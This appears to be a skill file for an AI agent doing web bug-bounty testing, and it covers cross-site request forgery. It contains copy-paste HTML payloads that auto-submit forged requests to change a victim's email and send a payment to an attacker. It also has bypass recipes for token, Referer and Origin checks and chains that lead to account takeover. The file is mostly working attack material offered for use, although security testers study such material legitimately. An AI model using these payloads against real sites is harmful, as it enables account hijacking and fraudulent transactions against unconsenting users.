# SKILL: CSRF (Classic / JSON / Same-Site=Lax / Login-CSRF / Logout-CSRF)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (csrf (classic / json / same-site=lax / login-csrf / logout-csrf)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
CSRF still alive when: SameSite=None, missing CSRF token, predictable token, GET state-change, JSON CSRF (Content-Type bypass), CORS-allow-credentials lapse.

---

## DETECTION
- Remove CSRF token → does request still succeed? Yes = bug.
- Replace token with attacker's token → success = wrong validation.
- Reuse old token → success = no per-session.
- Change `Content-Type: application/json` to `text/plain` → success = JSON CSRF.
- Same-Site=Lax + GET state-change endpoint → CSRF possible.

## EXPLOITATION
### Classic form CSRF
```html
<form action="https://target.com/api/email/change" method="POST">
  <input name="email" value="attacker@tld">
</form><script>document.forms[0].submit()</script>
```

### JSON CSRF via text/plain
```html
<form action="https://target.com/api/v1/payments" method="POST" enctype="text/plain">
  <input name='{"to":"attacker","amount":1000,"x":' value='"y"}'>
</form><script>document.forms[0].submit()</script>
```

### XHR-based CSRF (when CORS allows credentialed cross-origin POST)
Requires `Access-Control-Allow-Credentials: true` + `Access-Control-Allow-Origin: https://attacker.tld`.

### Login CSRF
Force victim to log in as attacker; later activity tied to attacker's account → leak victim's data into attacker's account.

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
- Token stripped → succeeds → no CSRF.
- Token validated only when present → omit param → bypass.
- Token tied to user, not session → use attacker's token.
- Referer/Origin allowlist with substring match → `https://attacker.tld/target.com`.
- Referer null → submit from data: URL or via downgrade `<meta name="referrer" content="never">`.

## CHAIN POTENTIAL
CSRF → email change → password reset → ATO. CSRF → 2FA disable → ATO.

## TOOLS
Burp CSRF PoC generator, autorize

## COMMANDS
```bash
# Burp Engagement Tools → Generate CSRF PoC
```

## EDGE CASES / NOT-A-BUG TRAPS
Same-Site=Lax default in modern Chrome means GET CSRF still works for top-level navigations; POST CSRF needs SameSite=None or no SameSite attribute.

## TRIAGE ANGLE (per platform)
Show end-to-end ATO PoC, not just "request succeeded".

## SEVERITY & CVSS
ATO via CSRF: 8.0+.

## REFERENCES
PortSwigger CSRF • PayloadsAllTheThings/CSRF Injection
